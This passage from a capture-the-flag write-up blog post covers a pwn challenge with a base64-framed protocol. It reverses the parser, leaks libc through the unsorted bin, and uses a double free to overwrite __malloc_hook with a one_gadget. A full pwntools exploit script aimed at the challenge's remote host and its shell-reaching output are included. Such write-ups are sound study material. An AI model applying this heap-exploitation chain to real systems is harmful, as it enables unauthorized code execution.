 v20[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4141414141414141</span>LL;<br>  <span class="hljs-keyword">if</span> ( sz &gt; <span class="hljs-number">0</span> )                                 <span class="hljs-comment">// copy data to data_buf</span><br>  &#123;<br>    v13 = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      *((_BYTE *)data_buf + v13) = str[v13 + <span class="hljs-number">0x20</span>];<br>      ++v13;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( sz &gt; v13 );<br>  &#125;<br>  v14 = data_buf;<br>  <span class="hljs-keyword">for</span> ( l = <span class="hljs-number">0LL</span>; l != <span class="hljs-number">8</span>; ++l )                  <span class="hljs-comment">// check end flag of protocol</span><br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *((_BYTE *)v20 + l) != *((_BYTE *)data_buf + l) )<br>    &#123;<br>      <span class="hljs-built_in">strcpy</span>(v23, <span class="hljs-string">&quot;Illegal Key!Your key is &quot;</span>);<br>      <span class="hljs-built_in">memset</span>(v24, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v24));<br>      _strcpy_chk((__int64)&amp;v23[<span class="hljs-number">24</span>], (__int64)data_buf, <span class="hljs-number">0x2000</span>LL);<br>      v18 = v23;<br>      <span class="hljs-keyword">goto</span> ERROR;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( qword_2030D8 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    v16 = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      *((_BYTE *)global_ptr + v16) = v26[v16 - <span class="hljs-number">0x3FF0</span> + sz];<br>      ++v16;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( qword_2030D8 &gt; v16 );<br>    v14 = data_buf;<br>  &#125;<br>  <span class="hljs-built_in">free</span>(v14);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)global_ptr;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>We can learn a lot from this function. because some especial data in header of protocol is very important, that can control malloc and calloc memory’s size, and some information can result parsing protocol error.</p>
<p>So we can write a encode function as follows:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc</span>(<span class="hljs-params">d, ca_sz = -<span class="hljs-number">1</span>, ma_sz = <span class="hljs-number">8</span>, ends = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">8</span></span>):<br>    <span class="hljs-keyword">if</span>(ca_sz == -<span class="hljs-number">1</span>):<br>        ca_sz = <span class="hljs-built_in">len</span>(d)<br>    p  = p64(<span class="hljs-number">0x1234567812345678</span>) <span class="hljs-comment"># vars[0]: magic</span><br>    p += p64(ca_sz + ma_sz + <span class="hljs-number">0x20</span>)  <span class="hljs-comment"># vars[1]: size</span><br>    p += p64(ma_sz) <span class="hljs-comment"># vars[2]: control malloc(size), data_buf</span><br>    p += p64(ca_sz) <span class="hljs-comment"># vars[3]: strlen(source string), that can control calloc size</span><br>    <span class="hljs-comment"># through the check function</span><br>    <span class="hljs-comment"># we must make vars[1] == vars[2] + vars[3]</span><br>    p += ends  <span class="hljs-comment"># end flags of protocol</span><br>    p += d<br>    p = base64.b64encode(p)<br>    <span class="hljs-keyword">return</span> p<br></code></pre></td></tr></table></figure>





<h3 id="Exploiting"><a href="#Exploiting" class="headerlink" title="Exploiting"></a>Exploiting</h3><p>How can we exploit? </p>
<p>First we should leak the libc, modify <code>__malloc_hook</code> as <code>one_gadget</code>  by some ways, when we call malloc, then we can get shell.</p>
<p>How we do that?</p>
<p>We don’t know remote version what it is. we have to leak libc information by some vulnerability. I just use a normal way, then the program crashed with double free.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">new(0x60, b&#x27;B&#x27; * 0x60)<br></code></pre></td></tr></table></figure>

<p>Dumpping information as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">b&#x27;eFY0EnhWNBI1AAAAAAAAAAgAAAAAAAAADQAAAAAAAABBQUFBQUFBQUlsbGVnYWwgSGVhZCE=\n&#x27;<br>    b&quot;*** Error in `./pwn&#x27;: double free or corruption (fasttop): 0x000055dcf13a6280 ***\n&quot;<br>    b&#x27;======= Backtrace: =========\n&#x27;<br>    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7f54311e47f5]\n&#x27;<br>    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x8038a)[0x7f54311ed38a]\n&#x27;<br>    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7f54311f158c]\n&#x27;<br>    b&#x27;./pwn(+0xd15)[0x55dcef7f6d15]\n&#x27;<br>    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f543118d840]\n&#x27;<br>    b&#x27;./pwn(+0xdc9)[0x55dcef7f6dc9]\n&#x27;<br>    b&#x27;======= Memory map: ========\n&#x27;<br></code></pre></td></tr></table></figure>

<p>We can calculate __libc_start_main address, that is 0x7f543118d840 - 0xf0, last 3 hex is 0x750. Use this website to find this libc and download it.</p>
<p><a target="_blank" rel="noopener" href="https://libc.blukat.me/">https://libc.blukat.me/</a></p>
<p>How to leak libc base address?</p>
<p>Using big unsorted bin can easily leak libc. We just malloc a big chunk, then free, when we next malloc our chunk</p>
<p>We can print main_arena address at our chunk</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># malloc big size chuck</span><br>ru(<span class="hljs-string">&#x27;jZSA/Pg==\n&#x27;</span>)<br>d = enc(<span class="hljs-string">b&#x27;&#x27;</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x400</span>) <span class="hljs-comment"># set calloc size as 0x18, malloc size as 0x400</span><br>s(d)<br>new(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x78&#x27;</span>) <span class="hljs-comment"># malloc our chunk, then print it, that will leak main_arena address</span><br>r = dp()<br>leak = u64(r.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = leak - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x10</span> - <span class="hljs-number">88</span><br>one_gadget = libc_base + <span class="hljs-number">0xf1207</span> <span class="hljs-comment"># Use one_gaget tools to find it</span><br>__malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br></code></pre></td></tr></table></figure>



<p>I debugged this program, I found have a lot min chunk to confusion layout of heap, so use heap overflow vulnerability not easily to control heap chunks. </p>
<p>But I found a double free vulnerability in this program. </p>
<p>In dec_input function</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ERROR:<br>    enc_print(v18);<br>    free(global_ptr);<br>    free(data_buf);<br>    return &quot;ERROR&quot;;<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>In main function</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"> v3 = dec_input();<br>        if ( !strcmp(v3, &quot;ERROR&quot;) )<br>        &#123;<br>          free(global_ptr);<br>          exit(0);<br>        &#125;<br>...<br><br>        enc_print(&quot;Size &gt;&gt;&quot;);<br>        v5 = dec_input();<br>        size = strtol(v5, 0LL, 10);<br>        free(global_ptr);<br>...<br></code></pre></td></tr></table></figure>

<p>If we make an error in dec_input function, then will trigger double free vulnerability.</p>
<p>free(global_ptr) -&gt; free(data_buf) -&gt; free(global_ptr).</p>
<p>We don’t want exit when trigging this double free vulnerability, so input size at New  statements can realize it.</p>
<p>How can we set double free?</p>
<p>Because we can control the global_ptr chunk size and data_buf chunk size by modifing protocol header.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">vars[2]: control malloc(size), data_buf<br>vars[3]: strlen(source string), that can control calloc size<br></code></pre></td></tr></table></figure>

<p>We want modify fastbin chunk’s fd  pointing to <code>__malloc_hook- 0x23</code> , malloc size and calloc size need to satisfy 0x60 ~ 0x68.</p>
<p>Make uaf, when we input size at New statments, we set ends flag is error, so free(global_ptr) -&gt; free(data_buf) -&gt; free(global_ptr)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">ru(<span class="hljs-string">&#x27;jZSA/Pg==\n&#x27;</span>)<br>   s(enc(<span class="hljs-string">b&#x27;1&#x27;</span>)) <span class="hljs-comment"># set malloc size as 0x400</span><br>   <span class="hljs-built_in">print</span>(dec(rl()))<br>   s(enc(<span class="hljs-string">b&#x27;A&#x27;</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">8</span>))<br></code></pre></td></tr></table></figure>

<p>debugging info: 0x70: 0x562c99a567a0 —▸ 0x562c99a56730 ◂— 0x562c99a567a0</p>
<p>Next, we just malloc(0x68), set contents as <code>__malloc_hook - 0x23</code>. So we modified the fastbin fd as our target address</p>
   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">new(<span class="hljs-number">0x68</span>, p64(__malloc_hook - <span class="hljs-number">0x23</span>))<br></code></pre></td></tr></table></figure>

<p>debugging info: 0x70: 0x5596226f6730 —▸ 0x5596226f67a0 —▸ 0x7f7baf0a6aed (_IO_wide_data_0+301)</p>
<p>Loop malloc(0x68) until malloc to <code>__malloc_hook - 0x23</code>, modify <code>__malloc_hook</code> as one_gadget,  we can get shell when next call malloc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">new(<span class="hljs-number">0x68</span>, p64(<span class="hljs-number">0</span>))<br>   <span class="hljs-comment"># debugging info: 0x70: 0x5651ddce97a0 —▸ 0x7faba905daed (_IO_wide_data_0+301)</span><br>   new(<span class="hljs-number">0x68</span>, p64(<span class="hljs-number">0</span>))<br>   <span class="hljs-comment"># debugging info: 0x70: 0x7ff0b226daed (_IO_wide_data_0+301)</span><br><br>   <span class="hljs-comment"># Malloc memory to target chunk</span><br>   <span class="hljs-comment"># Trigger get shell</span><br>   new(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x13</span> + p64(one_gadget))<br></code></pre></td></tr></table></figure>

<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>The full exp is as follows</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> os<br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">False</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><br>elf_path  = <span class="hljs-string">&#x27;pwn&#x27;</span><br><br><span class="hljs-comment"># remote server ip and port</span><br>host = <span class="hljs-string">&quot;8.140.179.11:13452&quot;</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">1</span><br><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc</span>(<span class="hljs-params">d, ca_sz = -<span class="hljs-number">1</span>, ma_sz = <span class="hljs-number">8</span>, ends = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">8</span></span>):<br>    <span class="hljs-keyword">if</span>(ca_sz == -<span class="hljs-number">1</span>):<br>        ca_sz = <span class="hljs-built_in">len</span>(d)<br>    p  = p64(<span class="hljs-number">0x1234567812345678</span>) <span class="hljs-comment"># vars[0]: magic</span><br>    p += p64(ca_sz + ma_sz + <span class="hljs-number">0x20</span>)  <span class="hljs-comment"># vars[1]: size</span><br>    p += p64(ma_sz) <span class="hljs-comment"># vars[2]: control malloc(size), data_buf</span><br>    p += p64(ca_sz) <span class="hljs-comment"># vars[3]: strlen(source string), that can control calloc size</span><br>    <span class="hljs-comment"># through the check function</span><br>    <span class="hljs-comment"># we must make vars[1] == vars[2] + vars[3]</span><br>    p += ends  <span class="hljs-comment"># end flags of protocol</span><br>    p += d<br>    p = base64.b64encode(p)<br>    <span class="hljs-keyword">return</span> p<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dec</span>(<span class="hljs-params">d</span>):<br>    p = base64.b64decode(d)<br>    <span class="hljs-keyword">return</span> p[<span class="hljs-number">0x28</span>:] <span class="hljs-comment"># Remove header info, return body data</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>    <span class="hljs-keyword">if</span>(LOCAL):<br>        gdb.attach(io)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">sz, d</span>):<br>    ru(<span class="hljs-string">&#x27;jZSA/Pg==\n&#x27;</span>)<br>    s(enc(<span class="hljs-string">b&#x27;1&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(dec(rl()))<br>    s(enc(<span class="hljs-built_in">str</span>(sz).encode()))<br>    <span class="hljs-built_in">print</span>(dec(rl()))<br>    s(enc(d))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>():<br>    ru(<span class="hljs-string">&#x27;jZSA/Pg==\n&#x27;</span>)<br>    s(enc(<span class="hljs-string">b&#x27;2&#x27;</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md</span>(<span class="hljs-params">d</span>):<br>    ru(<span class="hljs-string">&#x27;jZSA/Pg==\n&#x27;</span>)<br>    s(enc(<span class="hljs-string">b&#x27;3&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(dec(rl()))<br>    s(enc(d))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>():<br>    ru(<span class="hljs-string">&#x27;jZSA/Pg==\n&#x27;</span>)<br>    s(enc(<span class="hljs-string">b&#x27;4&#x27;</span>))<br>    <span class="hljs-keyword">return</span> dec(rl())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump_libc_version</span>():<br>    <span class="hljs-comment">#Dump remote libc, because trrger double free.</span><br>    <span class="hljs-comment">#/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f8b4a8ea840]</span><br>    <span class="hljs-comment"># libc6_2.23-0ubuntu11.2_amd64</span><br>    new(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">0x60</span>)<br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>    <span class="hljs-comment"># Dump libc version, I dumped it, the version is 2.23</span><br>    <span class="hljs-comment">#dump_libc_version()</span><br><br>    <span class="hljs-comment"># Leak libc base</span><br>    <span class="hljs-comment"># We just malloc a big chunk, then free, when we next malloc our chunk,</span><br>    <span class="hljs-comment"># We can print main_arena address at our chunk</span><br>    <span class="hljs-comment"># malloc big size chuck</span><br>    ru(<span class="hljs-string">&#x27;jZSA/Pg==\n&#x27;</span>)<br>    d = enc(<span class="hljs-string">b&#x27;&#x27;</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x400</span>) <span class="hljs-comment"># set malloc size as 0x400</span><br>    s(d)<br>    new(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x78&#x27;</span>) <span class="hljs-comment"># malloc our chunk, then print it, that will leak main_arena address</span><br>    r = dp()<br>    leak = u64(r.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    libc_base = leak - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x10</span> - <span class="hljs-number">88</span><br>    one_gadget = libc_base + <span class="hljs-number">0xf1207</span> <span class="hljs-comment"># Use one_gaget tools to find it</span><br>    __malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    li(<span class="hljs-string">&#x27;__malloc_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(__malloc_hook))<br>    li(<span class="hljs-string">&#x27;one_gadget: &#x27;</span> + <span class="hljs-built_in">hex</span>(one_gadget))<br><br>    <span class="hljs-comment"># Now we can use usf vulnerability to modify fastbin fd to __malloc_hook - 0x23</span><br>    <span class="hljs-comment"># So when we next malloc(0x70) memory, we can modify __malloc_hook buffer as one_gadget</span><br>    <span class="hljs-comment"># If we make dec_input return ERROR, so there is a obvious uaf vuln.</span><br>    <span class="hljs-comment"># If we wannt use this uaf vuln, we should malloc to our target address, so when we freed</span><br>    <span class="hljs-comment"># chunk, so next we must malloc to it, rather than exit this program</span><br>    <br>    <span class="hljs-comment"># Make uaf, when we input size at New statments, we set ends flag is error, so free(global_ptr) -&gt; free(data_buf) -&gt; free(global_ptr)</span><br><br>    ru(<span class="hljs-string">&#x27;jZSA/Pg==\n&#x27;</span>)<br>    s(enc(<span class="hljs-string">b&#x27;1&#x27;</span>)) <span class="hljs-comment"># set malloc size as 0x400</span><br>    <span class="hljs-built_in">print</span>(dec(rl()))<br>    s(enc(<span class="hljs-string">b&#x27;A&#x27;</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">8</span>))<br>    <span class="hljs-comment"># debugging info: 0x70: 0x562c99a567a0 —▸ 0x562c99a56730 ◂— 0x562c99a567a0</span><br>    <span class="hljs-comment"># Next, we just malloc(0x68), set contents as __malloc_hook - 0x23. So we modified the fastbin fd as our target address</span><br>    new(<span class="hljs-number">0x68</span>, p64(__malloc_hook - <span class="hljs-number">0x23</span>))<br>    <span class="hljs-comment"># debugging info: 0x70: 0x5596226f6730 —▸ 0x5596226f67a0 —▸ 0x7f7baf0a6aed (_IO_wide_data_0+301)</span><br><br>    new(<span class="hljs-number">0x68</span>, p64(<span class="hljs-number">0</span>))<br>    <span class="hljs-comment"># debugging info: 0x70: 0x5651ddce97a0 —▸ 0x7faba905daed (_IO_wide_data_0+301)</span><br>    new(<span class="hljs-number">0x68</span>, p64(<span class="hljs-number">0</span>))<br>    <span class="hljs-comment"># debugging info: 0x70: 0x7ff0b226daed (_IO_wide_data_0+301)</span><br><br>    <span class="hljs-comment"># Malloc memory to target chunk</span><br>    <span class="hljs-comment"># Trigger</span><br>    new(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x13</span> + p64(one_gadget))<br>    <br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>    ia()<br>    c()<br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> LOCAL:<br>        libc_path = <span class="hljs-string">&#x27;/glibc/2.23/64/lib/libc.so.6&#x27;</span><br>        elf = ELF(elf_path)<br>        <span class="hljs-keyword">if</span> LIBC:<br>            libc = ELF(libc_path)<br>        io = elf.process()<br>    <span class="hljs-keyword">else</span>:<br>        libc_path = <span class="hljs-string">&#x27;./libc6_2.23-0ubuntu11.2_amd64.so&#x27;</span><br>        elf = ELF(elf_path)<br>        io = remote(host.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>], <span class="hljs-built_in">int</span>(host.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>]))<br>        <span class="hljs-keyword">if</span> LIBC:<br>            libc = ELF(libc_path)<br>    exploit()<br>    finish()<br></code></pre></td></tr></table></figure>



<p>outputs:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">    b&#x27;./getflag\n&#x27;<br>[DEBUG] Received 0x37 bytes:<br>    00000000  1b 5b 34 37  3b 33 31 3b  35 6d 43 6f  6e 67 72 61  │·[47│;31;│5mCo│ngra│<br>    00000010  74 75 6c 61  74 69 6f 6e  73 2c 70 6c  65 61 73 65  │tula│tion│s,pl│ease│<br>    00000020  20 69 6e 70  75 74 20 79  6f 75 72 20  74 6f 6b 65  │ inp│ut y│our │toke│<br>    00000030  6e 3a 1b 5b  30 6d 20                               │n:·[│0m │<br>    00000037<br>Congratulations,please input your token: $<br></code></pre></td></tr></table></figure>



<p>Last: There are some questions helped by: flzx3qc, cnitlrt</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>This direction of ctf, I want use my free time to resolove these challenges. This paper will conntinue to update.</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div id="footer-link" style="right: calc(50% - 1px);order: 1;border-right: 1px solid #fe2;padding-left: unset;max-width: calc(50% - 4px);"><a href="/2021/04/03/tools/pwn/aarch64/">← Next AARCH64</a></div><div id="footer-link" style="left: 50%;order: 0;border-left: 1px solid #fe2;padding-right: unset;max-width: calc(50% - 5px);"><a href="/2021/04/01/security/cve/CVE-2021-3156/">Heap-Based Buffer Overflow in Sudo Prev →</a></div></div></div><details id="reward"><summary>打赏</summary><div id="alipay"><span>支付宝 | Alipay</span><br><img src="/img/Alipay.png"></div><div id="wechat"><span>微信 | WeChat</span><br><img src="/img/WeChat.png"></div></details><div id="Valine"></div></div><div id="bottom-btn"><a id="to-index" href="#toc-div" title="index">≡</a><a id="to-top" onClick="scrolls.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://github.com/Yue-plus">John Doe</a></h1><div id="description"></div></div><div id="aside-block"><div id="toc-div"><h1>INDEX</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Hong-Ming-Gu-Cup-Online"><span class="toc-number">1.</span> <span class="toc-text">Hong Ming Gu Cup Online</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-Maybe-fun-game-%E5%8F%8C%E8%BE%B9%E5%8D%8F%E8%AE%AE1-0"><span class="toc-number">1.1.</span> <span class="toc-text">PWN - [Maybe_fun_game (双边协议1.0)]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Intro"><span class="toc-number">1.1.1.</span> <span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reversing"><span class="toc-number">1.1.2.</span> <span class="toc-text">Reversing</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#munu-function"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">munu function</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#main-function"><span 